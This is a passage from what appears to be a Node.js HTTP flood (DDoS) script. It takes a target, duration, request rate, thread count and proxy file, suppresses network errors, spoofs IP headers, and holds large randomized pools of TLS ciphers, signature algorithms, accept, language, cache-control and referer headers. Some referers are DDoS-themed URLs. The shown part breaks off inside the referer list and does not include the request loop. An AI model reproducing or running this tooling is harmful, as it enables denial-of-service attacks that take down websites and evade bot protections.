}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
 
if (process.argv.length < 7){console.log(gradient.vice(`
node methodkontol <target> <duration> <request per second> <threads> <proxyfile>`));; process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
    const getRandomByte = () => {
      return Math.floor(Math.random() * 9999);
    };
    return `${getRandomByte()}`;
  };
  
  const spoofed2 = ip_spoof2();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
'ecdsa_brainpoolP256r1tls13_sha256',
'ecdsa_brainpoolP384r1tls13_sha384',
'ecdsa_brainpoolP512r1tls13_sha512',
'ecdsa_sha1',
'ed25519',
'ed448',
'ecdsa_sha224',
'rsa_pkcs1_sha1',
'rsa_pss_pss_sha256',
'dsa_sha256',
'dsa_sha384',
'dsa_sha512',
'dsa_sha224',
'dsa_sha1',
'rsa_pss_pss_sha384',
'rsa_pkcs1_sha2240',
'rsa_pss_pss_sha512',
'sm2sig_sm3',
'ecdsa_secp521r1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'
 ];
 const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
  
 ]; 

 const type = [
    "text/plain",
    "text/html",
    "application/json",
    "application/xml",
    "multipart/form-data",
    "application/octet-stream",
    "image/jpeg",
    "image/png",
    "audio/mpeg",
    "video/mp4",
    "application/javascript",
    "application/pdf",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/zip",
    "image/gif",
    "image/bmp",
    "image/tiff",
    "audio/wav",
    "audio/midi",
    "video/avi",
    "video/mpeg",
    "video/quicktime",
    "text/csv",
    "text/xml",
    "text/css",
    "text/javascript",
    "application/graphql",
    "application/x-www-form-urlencoded",
    "application/vnd.api+json",
    "application/ld+json",
    "application/x-pkcs12",
    "application/x-pkcs7-certificates",
    "application/x-pkcs7-certreqresp",
    "application/x-pem-file",
    "application/x-x509-ca-cert",
    "application/x-x509-user-cert",
    "application/x-x509-server-cert",
    "application/x-bzip",
    "application/x-gzip",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash"
   ];

const lang_header = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];

  const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
   
   const mediaTypes = [ 
    'text/html', 
    'application/xhtml+xml', 
    'application/xml', 
    'image/avif', 
    'image/webp', 
    'image/apng', 
    '/', 
    'application/signed-exchange' 
  ]; 

   const control_header = [ 
    'max-age=604800',
   'proxy-revalidate',
   'public, max-age=0',
   'max-age=315360000',
   'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
   's-maxage=604800',
   'max-stale',
   'public, immutable, max-age=31536000',
   'must-revalidate',
   'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
   'max-age=31536000,public,immutable',
   'max-age=31536000,public',
   'min-fresh',
   'private',
   'public',
   's-maxage',
   'no-cache',
   'no-cache, no-transform',
   'max-age=2592000',
   'no-store',
   'no-transform',
   'max-age=31557600',
   'stale-if-error',
   'only-if-cached',
   'max-age=0',
   'must-understand, no-store',
   'max-age=31536000; includeSubDomains',
   'max-age=31536000; includeSubDomains; preload',
   'max-age=120',
   'max-age=0,no-cache,no-store,must-revalidate',
   'public, max-age=604800, immutable',
   'max-age=0, must-revalidate, private',
   'max-age=0, private, must-revalidate',
   'max-age=604800, stale-while-revalidate=86400',
   'max-stale=3600',
   'public, max-age=2678400',
   'min-fresh=600',
   'public, max-age=30672000',
   'max-age=31536000, immutable',
   'max-age=604800, stale-if-error=86400',
   'public, max-age=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
   'public, s-maxage=600, max-age=60',
   'public, max-age=31536000',
   'max-age=14400, public',
   'max-age=14400',
   'max-age=600, private',
   'public, s-maxage=600, max-age=60',
   'no-store, no-cache, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  ];

 const Methods = [
    "GET",
    "HEAD",
    "POST",
    "PUT",
    "DELETE",
    "CONNECT",
    "OPTIONS",
    "TRACE",
    "PATCH",
  ];
   const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
   
 
 const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
